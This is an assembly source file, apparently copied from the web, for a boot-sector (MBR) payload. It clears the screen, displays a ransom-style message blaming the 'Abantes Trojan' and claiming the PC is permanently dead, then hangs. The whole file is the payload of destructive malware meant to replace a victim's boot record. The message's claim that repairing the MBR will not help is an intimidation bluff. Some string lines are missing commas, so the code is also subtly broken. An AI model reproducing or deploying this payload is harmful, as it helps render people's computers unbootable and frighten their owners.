;this isn't my code, I'm not good with assembly I got this online

BITS    16
ORG     0x7c00
  
jmp start
  
start:
        call clear_screen
        mov ax,cs
        mov ds,ax
        mov si,msg
         
        call print
  
print:
        push ax
        cld
next:
        mov al,[si]
        cmp al,0
        je done
        call printchar
        inc si
        jmp next
done:
        jmp $
  
printchar:
        mov ah,0x0e
        int 0x10
        ret
         
clear_screen:
        mov ah, 0x07
        mov al, 0x00
        mov bh, 0x0C        ;look up bios color attributes first digit background second is text
        mov cx, 0x0000
        mov dx, 0x184f
        int 0x10
        ret
   
msg:            db        "NEXT TIME READ THE RULES",13,10," ",13,10,"It Looks Like You Didn't Follow The Rules",13,10,"Now Your PC Has Been Trashed My The Abantes Trojan",13,10,"You're PC Will Never Work Again",13,10" ",13,10" ",13,10" ",13,10"NOTE:",13,10"Even If You Fix The MBR Your PC Is Still Dead", 0
times 510 - ($-$$) db 0
dw        0xaa55